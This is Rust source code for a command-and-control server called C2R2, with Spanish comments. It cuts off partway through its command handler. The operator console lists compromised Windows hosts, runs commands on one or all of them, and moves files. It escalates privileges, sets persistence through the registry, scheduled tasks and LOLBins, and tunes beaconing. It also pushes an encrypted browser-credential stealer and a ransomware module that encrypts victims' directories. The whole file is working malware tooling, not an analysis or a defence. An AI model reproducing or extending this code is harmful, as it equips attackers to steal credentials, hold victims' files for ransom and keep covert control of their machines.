fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();

    for chunk in data.chunks(3) {
        let mut buf = [0u8; 3];
        for (i, &byte) in chunk.iter().enumerate() {
            buf[i] = byte;
        }

        let b1 = (buf[0] >> 2) & 0x3F;
        let b2 = ((buf[0] & 0x03) << 4) | ((buf[1] >> 4) & 0x0F);
        let b3 = ((buf[1] & 0x0F) << 2) | ((buf[2] >> 6) & 0x03);
        let b4 = buf[2] & 0x3F;

        result.push(CHARS[b1 as usize] as char);
        result.push(CHARS[b2 as usize] as char);
        result.push(if chunk.len() > 1 {
            CHARS[b3 as usize] as char
        } else {
            '='
        });
        result.push(if chunk.len() > 2 {
            CHARS[b4 as usize] as char
        } else {
            '='
        });
    }

    result
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    // Si se solicita generar certificados, hacerlo y salir
    if args.generate_certs {
        println!(
            "{}",
            "╔═══════════════════════════════════════════════════════════╗".bright_cyan()
        );
        println!(
            "{}",
            "║          C2R2 - Generador de Certificados TLS            ║".bright_cyan()
        );
        println!(
            "{}",
            "╚═══════════════════════════════════════════════════════════╝".bright_cyan()
        );
        println!();

        match generate_self_signed_certs(&args.bind) {
            Ok(_) => {
                println!();
                println!(
                    "{} Certificados generados exitosamente.",
                    "✅".bright_green()
                );
                println!(
                    "{} Ahora puedes iniciar el servidor sin --generate-certs",
                    "ℹ️ ".bright_cyan()
                );
            }
            Err(e) => {
                eprintln!("{} {}", "❌ Error:".bright_red(), e);
                std::process::exit(1);
            }
        }
        return;
    }

    // Configurar el logger con archivos rotativos diarios
    let logs_dir = "logs";
    std::fs::create_dir_all(logs_dir).expect("No se pudo crear el directorio de logs");

    // Archivo rotativo diario para logs completos
    let file_appender = RollingFileAppender::new(Rotation::DAILY, logs_dir, "c2r2-session.log");

    // IMPORTANTE: Mantener el guard vivo durante toda la ejecución
    let (non_blocking, guard) = tracing_appender::non_blocking(file_appender);

    tracing_subscriber::fmt()
        .with_writer(non_blocking)
        .with_env_filter(
            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
        )
        .with_ansi(false) // Sin colores en archivos
        .with_target(false)
        .with_thread_ids(false)
        .with_file(false)
        .with_line_number(false)
        .with_level(true)
        .init();

    // Cargar configuración TLS
    let tls_config = match load_tls_config() {
        Ok(config) => config,
        Err(e) => {
            eprintln!("{} {}", "❌ Error TLS:".bright_red(), e);
            eprintln!(
                "{} Ejecuta primero: {} {}",
                "ℹ️ ".bright_cyan(),
                "cargo run --package c2r2-server --".bright_white(),
                "--generate-certs".bright_yellow()
            );
            std::process::exit(1);
        }
    };

    let tls_acceptor = TlsAcceptor::from(Arc::new(tls_config));

    info!("╔══════════════════════════════════════════════════════════════╗");
    info!("║          C2R2 Server v2.0 TLS - Session Started            ║");
    info!("║          Listening: {}:{:<43}║", args.bind, args.port);
    info!("╚══════════════════════════════════════════════════════════════╝");
    info!("");

    // Banner con colores (solo en consola)
    println!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".bright_cyan()
    );
    println!(
        "{}",
        "║       C2R2 - Command & Control Server v2.0 (TLS)         ║".bright_cyan()
    );
    println!(
        "{}",
        "║          🔐 Conexiones Encriptadas con TLS 1.3           ║".bright_cyan()
    );
    println!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".bright_cyan()
    );
    println!();
    println!(
        "{} {}",
        "🔐 TLS Listening:".bright_green().bold(),
        format!("{}:{}", args.bind, args.port).bright_white()
    );
    println!(
        "{} {}",
        "🌐 API Listening:".bright_green().bold(),
        format!("{}:{}", args.bind, args.api_port).bright_white()
    );
    println!(
        "{} {}",
        "📝 Help:".bright_yellow().bold(),
        "/help".bright_white()
    );
    println!(
        "{} {}",
        "📂 Logs:".bright_yellow().bold(),
        format!("{}/", logs_dir).bright_white()
    );
    println!(
        "{} {}",
        "🔑 Certs:".bright_yellow().bold(),
        format!("{}/", CERTS_DIR).bright_white()
    );
    if args.verbose {
        println!("{}", "🔍 Verbose Mode: ON".bright_magenta());
    }
    println!();

    let listener = TcpListener::bind(format!("{}:{}", args.bind, args.port))
        .await
        .expect("No se pudo iniciar el servidor");

    let clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>> = Arc::new(Mutex::new(HashMap::new()));
    let next_id = Arc::new(AtomicU64::new(1));
    let selected_client: Arc<Mutex<Option<ClientId>>> = Arc::new(Mutex::new(None));

    // Create API state for team client communication
    let api_state = Arc::new(ApiState::new(args.api_password.clone(), args.verbose));

    // Start HTTP API server for team clients
    let api_state_http = api_state.clone();
    let api_bind = args.bind.clone();
    let api_port = args.api_port;
    tokio::spawn(async move {
        let app = create_api_router(api_state_http);
        let addr = format!("{}:{}", api_bind, api_port);
        info!("Starting Team Client API on {}", addr);
        let listener = tokio::net::TcpListener::bind(&addr)
            .await
            .expect("Failed to bind API server");
        if let Err(e) = axum::serve(listener, app).await {
            error!("API server error: {}", e);
        }
    });

    // Tarea para aceptar conexiones TLS
    let clients_clone = clients.clone();
    let next_id_clone = next_id.clone();
    let api_state_clone = api_state.clone();
    let verbose = args.verbose;
    tokio::spawn(async move {
        loop {
            match listener.accept().await {
                Ok((tcp_stream, peer_addr)) => {
                    let id = next_id_clone.fetch_add(1, Ordering::SeqCst);
                    let clients = clients_clone.clone();
                    let api_state = api_state_clone.clone();
                    let acceptor = tls_acceptor.clone();
                    let addr = peer_addr.to_string();

                    tokio::spawn(async move {
                        // Realizar handshake TLS
                        match acceptor.accept(tcp_stream).await {
                            Ok(tls_stream) => {
                                handle_client(id, tls_stream, addr, clients, api_state, verbose)
                                    .await;
                            }
                            Err(e) => {
                                if verbose {
                                    eprintln!(
                                        "{} TLS handshake fallido desde {}: {}",
                                        "⚠️ ".bright_yellow(),
                                        addr,
                                        e
                                    );
                                }
                            }
                        }
                    });
                }
                Err(e) => {
                    eprintln!("{} {}", "❌ Error:".bright_red().bold(), e);
                }
            }
        }
    });
    
    // Loop para comandos del usuario con rustyline
    let mut rl = DefaultEditor::new().expect("No se pudo inicializar rustyline");

    // Intentar cargar historial
    let history_file = ".c2r2_history";
    let _ = rl.load_history(history_file);

    loop {
        // Mostrar prompt con cliente seleccionado
        let selected = *selected_client.lock().unwrap();
        let prompt = if let Some(id) = selected {
            format!("{} ", format!("C2R2[{}]>", id).bright_green().bold())
        } else {
            format!("{} ", "C2R2>".bright_blue().bold())
        };

        match rl.readline(&prompt) {
            Ok(line) => {
                // Limpiar caracteres de escape de bracketed paste mode
                // Formato: ESC[200~ (inicio) y ESC[201~ (fin)
                let clean_line = line
                    .replace("\x1b[200~", "")
                    .replace("\x1b[201~", "")
                    .replace("←[200~", "") // Algunas terminales lo muestran así
                    .replace("←[201~", "");

                // Agregar al historial
                let _ = rl.add_history_entry(clean_line.as_str());

                let parts = parse_command_line(clean_line.trim());

                if parts.is_empty() {
                    continue;
                }

                match parts[0].as_str() {
                    "/help" => {
                        println!();
                        println!(
                            "{}",
                            "═══════════════════════════════════════════════════════════"
                                .bright_cyan()
                        );
                        println!(
                            "{}",
                            "                    📖 COMANDOS DISPONIBLES"
                                .bright_cyan()
                                .bold()
                        );
                        println!(
                            "{}",
                            "═══════════════════════════════════════════════════════════"
                                .bright_cyan()
                        );
                        println!();
                        println!(
                            "  {} {:<20} {}",
                            "📋".bright_yellow(),
                            "/list",
                            "Lista todos los clientes conectados con info".bright_white()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "🎯".bright_green(),
                            "/select <id>",
                            "Selecciona un cliente por ID".bright_white()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "📤".bright_blue(),
                            "/cmd <comando>",
                            "Envía comando al cliente seleccionado".bright_white()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "📡".bright_magenta(),
                            "/cmd_all <cmd>",
                            "Envía comando a TODOS los clientes".bright_white()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "📥".bright_cyan(),
                            "/download <ruta>",
                            "Descarga archivo desde el cliente".bright_white()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "📤".bright_green(),
                            "/upload <local> <remoto>",
                            "Sube archivo al cliente".bright_white()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "🔑".bright_red(),
                            "/harvest",
                            "Roba credenciales de browsers (Chrome, Edge, Firefox, etc.)"
                                .bright_white()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "🔒".bright_red(),
                            "/encrypt <ruta> [depth]",
                            "Encripta archivos en directorio (default depth=5)".bright_white()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "🔓".bright_green(),
                            "/decrypt <ruta> <key> [depth]",
                            "Desencripta archivos con clave".bright_white()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "📌".bright_magenta(),
                            "/persist <method>",
                            "Establece persistencia".bright_white()
                        );
                        println!(
                            "{}",
                            "      Métodos tradicionales: registry, task, wmi, startup".bright_white().dimmed()
                        );
                        println!(
                            "{}",
                            "      Métodos LOLBAS (LOLBins): forfiles(mshta), regsvr32, rundll, certutil".bright_white().dimmed()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "🧹".bright_yellow(),
                            "/persist_remove",
                            "Remueve persistencia del cliente".bright_white()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "📡".bright_blue(),
                            "/beacon <int:jit>",
                            "Configura intervalo beacon (ej: 60:30 = 60s ±30%)".bright_white()
                        );
                        println!("  {} {:<20} {}", "⬆️ ".bright_red(), "/elevate", "Re-ejecuta agente como admin (UAC prompt, después todos los cmds son admin)".bright_white());
                        println!(
                            "  {} {:<20} {}",
                            "ℹ️ ".bright_cyan(),
                            "/info <id>",
                            "Muestra info detallada de un cliente".bright_white()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "🔄".bright_yellow(),
                            "/deselect",
                            "Deselecciona el cliente actual".bright_white()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "👋".bright_red(),
                            "/exit, /quit",
                            "Cierra el servidor".bright_white()
                        );
                        println!(
                            "  {} {:<20} {}",
                            "❓".bright_cyan(),
                            "/help",
                            "Muestra este menú".bright_white()
                        );
                        println!();
                        println!(
                            "{}",
                            "═══════════════════════════════════════════════════════════"
                                .bright_cyan()
                        );
                        println!();
                    }
                    "/list" => {
                        let clients = clients.lock().unwrap();
                        if clients.is_empty() {
                            println!("{}", "⚠️  No hay clientes conectados".bright_yellow());
                        } else {
                            println!();
                            let mut table = Table::new();
                            table.set_format(*format::consts::FORMAT_BOX_CHARS);

                            // Header con colores
                            table.add_row(Row::new(vec![
                                Cell::new("ID").style_spec("Fb"),
                                Cell::new("Dirección").style_spec("Fb"),
                                Cell::new("Hostname").style_spec("Fb"),
                                Cell::new("Usuario").style_spec("Fb"),
                                Cell::new("OS").style_spec("Fb"),
                                Cell::new("Privilegios").style_spec("Fb"),
                                Cell::new("Conectado").style_spec("Fb"),
                            ]));

                            for (id, client) in clients.iter() {
                                let info = client.info.lock().unwrap();
                                let priv_color = if info.privileges.as_deref() == Some("Admin") {
                                    "Fr"
                                } else {
                                    "Fy"
                                };

                                table.add_row(Row::new(vec![
                                    Cell::new(&id.to_string()).style_spec("Fc"),
                                    Cell::new(&info.addr),
                                    Cell::new(info.hostname.as_deref().unwrap_or("...")),
                                    Cell::new(info.username.as_deref().unwrap_or("...")),
                                    Cell::new(info.os_version.as_deref().unwrap_or("...")),
                                    Cell::new(info.privileges.as_deref().unwrap_or("..."))
                                        .style_spec(priv_color),
                                    Cell::new(&info.connected_at).style_spec("Fd"),
                                ]));
                            }

                            println!(
                                "{}",
                                format!("📋 {} cliente(s) conectado(s)", clients.len())
                                    .bright_green()
                                    .bold()
                            );
                            table.printstd();
                            println!();
                        }
                    }
                    "/info" => {
                        if parts.len() < 2 {
                            println!("{} /info <id>", "❌ Uso:".bright_red());
                            continue;
                        }

                        if let Ok(id) = parts[1].parse::<ClientId>() {
                            let clients = clients.lock().unwrap();
                            if let Some(client) = clients.get(&id) {
                                let info = client.info.lock().unwrap();
                                println!();
                                println!(
                                    "{}",
                                    "╔═══════════════════════════════════════════════════════════╗"
                                        .bright_cyan()
                                );
                                println!("{}", format!("║              INFORMACIÓN DEL CLIENTE [{}]                ║", id).bright_cyan().bold());
                                println!(
                                    "{}",
                                    "╚═══════════════════════════════════════════════════════════╝"
                                        .bright_cyan()
                                );
                                println!();
                                println!(
                                    "  {} {}",
                                    "🆔 ID:".bright_green().bold(),
                                    id.to_string().bright_white()
                                );
                                println!(
                                    "  {} {}",
                                    "🌐 Dirección:".bright_green().bold(),
                                    info.addr.bright_white()
                                );
                                println!(
                                    "  {} {}",
                                    "💻 Hostname:".bright_green().bold(),
                                    info.hostname.as_deref().unwrap_or("N/A").bright_white()
                                );
                                println!(
                                    "  {} {}",
                                    "👤 Usuario:".bright_green().bold(),
                                    info.username.as_deref().unwrap_or("N/A").bright_white()
                                );
                                println!(
                                    "  {} {}",
                                    "🖥️  OS:".bright_green().bold(),
                                    info.os_version.as_deref().unwrap_or("N/A").bright_white()
                                );

                                let priv_str = info.privileges.as_deref().unwrap_or("N/A");
                                let priv_colored = if priv_str == "Admin" {
                                    priv_str.bright_red().bold()
                                } else {
                                    priv_str.bright_yellow().bold()
                                };
                                println!(
                                    "  {} {}",
                                    "🔑 Privilegios:".bright_green().bold(),
                                    priv_colored
                                );
                                println!(
                                    "  {} {}",
                                    "⏰ Conectado:".bright_green().bold(),
                                    info.connected_at.bright_white()
                                );
                                println!();
                            } else {
                                println!("{} Cliente {} no encontrado", "❌".bright_red(), id);
                            }
                        } else {
                            println!("{} ID inválido", "❌".bright_red());
                        }
                    }
                    "/select" => {
                        if parts.len() < 2 {
                            println!("{} /select <id>", "❌ Uso:".bright_red());
                            continue;
                        }

                        if let Ok(id) = parts[1].parse::<ClientId>() {
                            let clients = clients.lock().unwrap();
                            if clients.contains_key(&id) {
                                *selected_client.lock().unwrap() = Some(id);
                                println!(
                                    "{} {}",
                                    "✅ Cliente".bright_green(),
                                    format!("[{}]", id).bright_cyan().bold()
                                );
                                println!(
                                    "{}",
                                    "   Usa /cmd <comando> para enviar comandos"
                                        .bright_white()
                                        .dimmed()
                                );
                            } else {
                                println!("{} Cliente {} no encontrado", "❌".bright_red(), id);
                            }
                        } else {
                            println!("{} ID inválido", "❌".bright_red());
                        }
                    }
                    "/deselect" => {
                        *selected_client.lock().unwrap() = None;
                        println!("{}", "✅ Cliente deseleccionado".bright_green());
                    }
                    "/download" => {
                        if parts.len() < 2 {
                            println!("{} /download <ruta_remota>", "❌ Uso:".bright_red());
                            continue;
                        }

                        let remote_path = parts[1..].join(" ");
                        let selected = *selected_client.lock().unwrap();

                        if let Some(id) = selected {
                            let clients = clients.lock().unwrap();

                            if let Some(client) = clients.get(&id) {
                                let command = format!("__DOWNLOAD__:{}", remote_path);
                                info!("[{}] Comando /download: {}", id, remote_path);
                                if let Err(e) = client.tx.send(command) {
                                    error!("[{}] Error enviando comando download: {}", id, e);
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                } else {
                                    println!(
                                        "{} Solicitando descarga de: {}",
                                        "📥".bright_cyan(),
                                        remote_path.bright_white()
                                    );
                                }
                            } else {
                                println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                                *selected_client.lock().unwrap() = None;
                            }
                        } else {
                            println!(
                                "{}",
                                "❌ No hay cliente seleccionado. Usa /select <id>".bright_red()
                            );
                        }
                    }
                    "/upload" => {
                        if parts.len() < 3 {
                            println!(
                                "{} /upload <archivo_local> <ruta_remota>",
                                "❌ Uso:".bright_red()
                            );
                            continue;
                        }

                        let local_path = &parts[1];
                        let remote_path = parts[2..].join(" ");
                        let selected = *selected_client.lock().unwrap();

                        if let Some(id) = selected {
                            // Verificar si el path remoto es un directorio (termina en \)
                            let final_remote_path =
                                if remote_path.ends_with('\\') || remote_path.ends_with('/') {
                                    // Si es directorio, agregar el nombre del archivo local
                                    let filename = std::path::Path::new(local_path)
                                        .file_name()
                                        .and_then(|n| n.to_str())
                                        .unwrap_or("uploaded_file");
                                    format!("{}{}", remote_path, filename)
                                } else {
                                    remote_path
                                };

                            // Leer archivo local
                            match fs::read(local_path) {
                                Ok(file_data) => {
                                    let encoded = base64_encode(&file_data);
                                    let command =
                                        format!("__UPLOAD__|{}|{}", final_remote_path, encoded);

                                    info!(
                                        "[{}] Comando /upload: {} -> {} ({} bytes)",
                                        id,
                                        local_path,
                                        final_remote_path,
                                        file_data.len()
                                    );

                                    let clients = clients.lock().unwrap();
                                    if let Some(client) = clients.get(&id) {
                                        if let Err(e) = client.tx.send(command) {
                                            error!("[{}] Error enviando comando upload: {}", id, e);
                                            println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                        } else {
                                            println!();
                                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
                                            println!(
                                                "{}",
                                                format!(
                                                    "║              📤 SUBIENDO ARCHIVO [{}]",
                                                    id
                                                )
                                                .bright_cyan()
                                                .bold()
                                            );
                                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
                                            println!();
                                            println!(
                                                "  {} {}",
                                                "📄 Local:".bright_green().bold(),
                                                local_path.bright_white()
                                            );
                                            println!(
                                                "  {} {}",
                                                "🎯 Remoto:".bright_green().bold(),
                                                final_remote_path.bright_white()
                                            );
                                            println!(
                                                "  {} {}",
                                                "📊 Tamaño:".bright_green().bold(),
                                                format!("{} bytes", file_data.len()).bright_white()
                                            );
                                            println!();
                                        }
                                    } else {
                                        println!(
                                            "{} Cliente {} desconectado",
                                            "❌".bright_red(),
                                            id
                                        );
                                        *selected_client.lock().unwrap() = None;
                                    }
                                }
                                Err(e) => {
                                    error!(
                                        "[{}] Error leyendo archivo local '{}': {}",
                                        id, local_path, e
                                    );
                                    println!(
                                        "{} Error leyendo archivo local '{}': {}",
                                        "❌".bright_red(),
                                        local_path,
                                        e
                                    );
                                }
                            }
                        } else {
                            println!(
                                "{}",
                                "❌ No hay cliente seleccionado. Usa /select <id>".bright_red()
                            );
                        }
                    }
                    "/harvest" => {
                        let selected = *selected_client.lock().unwrap();

                        if let Some(id) = selected {
                            let clients = clients.lock().unwrap();

                            if let Some(client) = clients.get(&id) {
                                info!(
                                    "[{}] Comando /harvest: Robando credenciales de browsers",
                                    id
                                );

                                // Verificar que existan los archivos del módulo
                                let modules_dir = get_modules_path();
                                let stealer_enc_path = modules_dir.join("stealer.enc");
                                let stealer_key_path = modules_dir.join("stealer.key");

                                if !stealer_enc_path.exists() {
                                    println!(
                                        "{}",
                                        "❌ Error: stealer.enc no encontrado".bright_red()
                                    );
                                    println!("   Ruta buscada: {}", stealer_enc_path.display());
                                    println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module".bright_yellow());
                                    continue;
                                }

                                if !stealer_key_path.exists() {
                                    println!(
                                        "{}",
                                        "❌ Error: stealer.key no encontrado".bright_red()
                                    );
                                    println!("   Ruta buscada: {}", stealer_key_path.display());
                                    println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module".bright_yellow());
                                    continue;
                                }

                                // Leer archivos
                                let dll_data = match fs::read(stealer_enc_path) {
                                    Ok(data) => data,
                                    Err(e) => {
                                        println!(
                                            "{} Error leyendo stealer.enc: {}",
                                            "❌".bright_red(),
                                            e
                                        );
                                        continue;
                                    }
                                };

                                let key_data = match fs::read(stealer_key_path) {
                                    Ok(data) => data,
                                    Err(e) => {
                                        println!(
                                            "{} Error leyendo stealer.key: {}",
                                            "❌".bright_red(),
                                            e
                                        );
                                        continue;
                                    }
                                };

                                println!();
                                println!(
                                    "{}",
                                    "╔═══════════════════════════════════════════════════════════╗"
                                        .bright_red()
                                );
                                println!(
                                    "{}",
                                    format!("║           🔑 HARVESTING CREDENTIALS [{}]", id)
                                        .bright_red()
                                        .bold()
                                );
                                println!(
                                    "{}",
                                    "╚═══════════════════════════════════════════════════════════╝"
                                        .bright_red()
                                );
                                println!();
                                println!("{}", "  📤 Subiendo stealer.enc...".bright_yellow());

                                // Subir DLL encriptada
                                let encoded_dll = base64_encode(&dll_data);
                                let upload_dll_cmd =
                                    format!("__UPLOAD__|stealer.enc|{}", encoded_dll);
                                if let Err(e) = client.tx.send(upload_dll_cmd) {
                                    error!("[{}] Error enviando stealer.enc: {}", id, e);
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                    continue;
                                }

                                // Esperar un poco para que se suba
                                std::thread::sleep(std::time::Duration::from_millis(200));

                                println!("{}", "  � Subiendo stealer.key...".bright_yellow());

                                // Subir clave
                                let encoded_key = base64_encode(&key_data);
                                let upload_key_cmd =
                                    format!("__UPLOAD__|stealer.key|{}", encoded_key);
                                if let Err(e) = client.tx.send(upload_key_cmd) {
                                    error!("[{}] Error enviando stealer.key: {}", id, e);
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                    continue;
                                }

                                // Esperar un poco
                                std::thread::sleep(std::time::Duration::from_millis(200));

                                println!("{}", "  🚀 Ejecutando stealer...".bright_yellow());
                                println!(
                                    "{}",
                                    "  🎯 Chrome, Edge, Firefox, Brave, Opera"
                                        .bright_white()
                                        .dimmed()
                                );
                                println!(
                                    "{}",
                                    "  ⏳ Esperando credenciales...".bright_white().dimmed()
                                );
                                println!();

                                // Enviar comando de harvest
                                if let Err(e) = client.tx.send("__HARVEST__".to_string()) {
                                    error!("[{}] Error enviando comando __HARVEST__: {}", id, e);
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                }
                            } else {
                                println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                                *selected_client.lock().unwrap() = None;
                            }
                        } else {
                            println!(
                                "{}",
                                "❌ No hay cliente seleccionado. Usa /select <id>".bright_red()
                            );
                        }
                    }
                    "/encrypt" => {
                        if parts.len() < 2 {
                            println!("{}  /encrypt <ruta> [max_depth]", "❌ Uso:".bright_red());
                            println!("   Ejemplo: /encrypt C:\\\\Users\\\\Victim\\\\Documents 5");
                            continue;
                        }

                        // Extraer path y max_depth correctamente
                        let (path, max_depth) =
                            if parts.len() > 2 && parts[parts.len() - 1].parse::<u32>().is_ok() {
                                // Último argumento es un número (max_depth)
                                (
                                    parts[1..parts.len() - 1].join(" "),
                                    parts[parts.len() - 1].as_str(),
                                )
                            } else {
                                // Sin max_depth, usar todo como path
                                (parts[1..].join(" "), "5")
                            };

                        let selected = *selected_client.lock().unwrap();

                        if let Some(id) = selected {
                            let clients = clients.lock().unwrap();

                            if let Some(client) = clients.get(&id) {
                                info!(
                                    "[{}] Comando /encrypt: Encriptando archivos en {}",
                                    id, path
                                );

                                // Verificar que existan los archivos del módulo
                                let modules_dir = get_modules_path();
                                let ransomware_enc_path = modules_dir.join("ransomware.enc");
                                let ransomware_key_path = modules_dir.join("ransomware.key");

                                if !ransomware_enc_path.exists() || !ransomware_key_path.exists() {
                                    println!(
                                        "{}",
                                        "❌ Error: Módulo ransomware no encontrado".bright_red()
                                    );
                                    println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module --module ransomware".bright_yellow());
                                    continue;
                                }

                                // Leer archivos
                                let dll_data = match fs::read(&ransomware_enc_path) {
                                    Ok(data) => data,
                                    Err(e) => {
                                        println!(
                                            "{} Error leyendo ransomware.enc: {}",
                                            "❌".bright_red(),
                                            e
                                        );
                                        continue;
                                    }
                                };

                                let key_data = match fs::read(&ransomware_key_path) {
                                    Ok(data) => data,
                                    Err(e) => {
                                        println!(
                                            "{} Error leyendo ransomware.key: {}",
                                            "❌".bright_red(),
                                            e
                                        );
                                        continue;
                                    }
                                };

                                println!();
                                println!(
                                    "{}",
                                    "╔═══════════════════════════════════════════════════════════╗"
                                        .bright_red()
                                );
                                println!(
                                    "{}",
                                    format!("║           🔒 ENCRYPTING FILES [{}]", id)
                                        .bright_red()
                                        .bold()
                                );
                                println!(
                                    "{}",
                                    "╚═══════════════════════════════════════════════════════════╝"
                                        .bright_red()
                                );
                                println!();
                                println!("{}", "  📤 Subiendo ransomware.enc...".bright_yellow());

                                // Subir DLL encriptada
                                let encoded_dll = base64_encode(&dll_data);
                                let upload_dll_cmd =
                                    format!("__UPLOAD__|ransomware.enc|{}", encoded_dll);
                                if let Err(e) = client.tx.send(upload_dll_cmd) {
                                    error!("[{}] Error enviando ransomware.enc: {}", id, e);
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                    continue;
                                }

                                std::thread::sleep(std::time::Duration::from_millis(200));

                                println!("{}", "  🔑 Subiendo ransomware.key...".bright_yellow());

                                // Subir clave
                                let encoded_key = base64_encode(&key_data);
                                let upload_key_cmd =
                                    format!("__UPLOAD__|ransomware.key|{}", encoded_key);
                                if let Err(e) = client.tx.send(upload_key_cmd) {
                                    error!("[{}] Error enviando ransomware.key: {}", id, e);
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                    continue;
                                }

                                std::thread::sleep(std::time::Duration::from_millis(200));

                                println!("{}", "  🔒 Ejecutando encriptación...".bright_yellow());
                                println!();

                                // Ejecutar ransomware
                                let encrypt_cmd = format!("__ENCRYPT__:{}|{}", path, max_depth);
                                if let Err(e) = client.tx.send(encrypt_cmd) {
                                    error!("[{}] Error enviando comando __ENCRYPT__: {}", id, e);
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                }
                            } else {
                                println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                                *selected_client.lock().unwrap() = None;
                            }
                        } else {
                            println!(
                                "{}",
                                "❌ No hay cliente seleccionado. Usa /select <id>".bright_red()
                            );
                        }
                    }
                    "/decrypt" => {
                        if parts.len() < 3 {
                            println!(
                                "{} /decrypt <ruta> <key> [max_depth]",
                                "❌ Uso:".bright_red()
                            );
                            println!("   Ejemplo: /decrypt C:\\\\Users\\\\Victim\\\\Documents abc123... 5");
                            continue;
                        }

                        // Parsear argumentos: necesitamos separar path, key y max_depth opcional
                        // Formato: /decrypt <path> <key> [max_depth]
                        // El key es una string sin espacios (hash hex)
                        // max_depth es un número opcional al final

                        // Verificar si el último argumento es max_depth (número)
                        let (path_and_key, max_depth) =
                            if parts.len() > 3 && parts[parts.len() - 1].parse::<u32>().is_ok() {
                                (&parts[1..parts.len() - 1], parts[parts.len() - 1].as_str())
                            } else {
                                (&parts[1..], "5")
                            };

                        // El último elemento de path_and_key es el key (sin espacios)
                        // Todo lo anterior es el path (puede tener espacios)
                        if path_and_key.len() < 2 {
                            println!("{} Debe especificar ruta y clave", "❌ Error:".bright_red());
                            continue;
                        }

                        let key = &path_and_key[path_and_key.len() - 1];
                        let path = path_and_key[..path_and_key.len() - 1].join(" ");

                        // Debug: mostrar qué se parseó
                        println!(
                            "DEBUG: path='{}', key='{}', max_depth='{}'",
                            path, key, max_depth
                        );

                        let selected = *selected_client.lock().unwrap();

                        if let Some(id) = selected {
                            let clients = clients.lock().unwrap();

                            if let Some(client) = clients.get(&id) {
                                info!(
                                    "[{}] Comando /decrypt: Desencriptando archivos en {}",
                                    id, path
                                );

                                // Verificar que existan los archivos del módulo
                                let modules_dir = get_modules_path();
                                let ransomware_enc_path = modules_dir.join("ransomware.enc");
                                let ransomware_key_path = modules_dir.join("ransomware.key");

                                if !ransomware_enc_path.exists() || !ransomware_key_path.exists() {
                                    println!(
                                        "{}",
                                        "❌ Error: Módulo ransomware no encontrado".bright_red()
                                    );
                                    println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module --module ransomware".bright_yellow());
                                    continue;
                                }

                                // Leer archivos
                                let dll_data = match fs::read(&ransomware_enc_path) {
                                    Ok(data) => data,
                                    Err(e) => {
                                        println!(
                                            "{} Error leyendo ransomware.enc: {}",
                                            "❌".bright_red(),
                                            e
                                        );
                                        continue;
                                    }
                                };

                                let key_data = match fs::read(&ransomware_key_path) {
                                    Ok(data) => data,
                                    Err(e) => {
                                        println!(
                                            "{} Error leyendo ransomware.key: {}",
                                            "❌".bright_red(),
                                            e
                                        );
                                        continue;
                                    }
                                };

                                println!();
                                println!(
                                    "{}",
                                    "╔═══════════════════════════════════════════════════════════╗"
                                        .bright_green()
                                );
                                println!(
                                    "{}",
                                    format!("║           🔓 DECRYPTING FILES [{}]", id)
                                        .bright_green()
                                        .bold()
                                );
                                println!(
                                    "{}",
                                    "╚═══════════════════════════════════════════════════════════╝"
                                        .bright_green()
                                );
                                println!();
                                println!("{}", "  📤 Subiendo ransomware.enc...".bright_yellow());

                                // Subir DLL encriptada
                                let encoded_dll = base64_encode(&dll_data);
                                let upload_dll_cmd =
                                    format!("__UPLOAD__|ransomware.enc|{}", encoded_dll);
                                if let Err(e) = client.tx.send(upload_dll_cmd) {
                                    error!("[{}] Error enviando ransomware.enc: {}", id, e);
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                    continue;
                                }

                                std::thread::sleep(std::time::Duration::from_millis(200));

                                println!("{}", "  🔑 Subiendo ransomware.key...".bright_yellow());

                                // Subir clave
                                let encoded_key = base64_encode(&key_data);
                                let upload_key_cmd =
                                    format!("__UPLOAD__|ransomware.key|{}", encoded_key);
                                if let Err(e) = client.tx.send(upload_key_cmd) {
                                    error!("[{}] Error enviando ransomware.key: {}", id, e);
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                    continue;
                                }

                                std::thread::sleep(std::time::Duration::from_millis(200));

                                println!(
                                    "{}",
                                    "  🔓 Ejecutando desencriptación...".bright_yellow()
                                );
                                println!();

                                // Ejecutar desencriptación
                                let decrypt_cmd =
                                    format!("__DECRYPT__:{}|{}|{}", path, key, max_depth);
                                if let Err(e) = client.tx.send(decrypt_cmd) {
                                    error!("[{}] Error enviando comando __DECRYPT__: {}", id, e);
                                    println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                }
                            } else {
